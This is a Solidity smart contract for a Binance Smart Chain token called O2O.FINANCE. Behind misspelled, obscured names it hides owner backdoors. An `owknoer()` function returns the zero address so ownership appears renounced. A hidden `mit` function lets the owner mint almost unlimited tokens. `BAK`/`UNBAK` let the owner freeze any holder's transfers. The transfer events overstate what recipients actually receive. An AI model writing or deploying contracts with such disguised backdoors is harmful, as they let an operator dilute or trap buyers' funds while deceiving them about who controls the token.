/**
 *Submitted for verification at BscScan.com on 2022-07-26
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owknoer;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owknoer);
        _;
    }

/**
    * @dev Returns the address of the current owknoer.
     */
    function owknoer() public pure returns (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owknoer, newowneres);
        owknoer = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owknoer, address(0));
        owknoer = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'O2O.FINANCE';

    string constant public symbol = 'O2O';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 10000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromfii;

    mapping(address => bool) private _lkck;


    uint256 public _taxfii = 0;
    uint256 private _previousTaxfii = _taxfii;

    uint256 public _burnfii = 1;
    uint256 private _previousBurnfii = _burnfii;


    address public projectAddress = 0x268954eB152D4E86C536F9b720f4D1f234eD1F39;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owknoer, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(_isExcludedFromfii[from])
            removeAllfii();

        uint256 fii =  calculateTaxfii(value);

        uint256 burn =  calculateBurnfii(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(fii).sub(burn);

        if(fii > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(fii);
            emit Transfer(from, projectAddress, fii);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfii[from])
            restoreAllfii();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function mit(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxfii(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfii).div(
            10 ** 2
        );
    }

    function calculateBurnfii(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfii).div(
            10 ** 2
        );
    }

    function removeAllfii() private {
        if(_taxfii == 0 && _burnfii == 0)
            return;

        _previousTaxfii = _taxfii;
        _previousBurnfii = _burnfii;
        _taxfii = 0;
        _burnfii = 0;
    }

    function restoreAllfii() private {
        _taxfii = _previousTaxfii;
        _burnfii = _previousBurnfii;
    }



    function BAK(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function UNBAK(address account) public onlyowneres {
        _lkck[account] = false;
    }


    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owknoer = msg.sender;


    }

    function() public payable {
       revert();
    }
}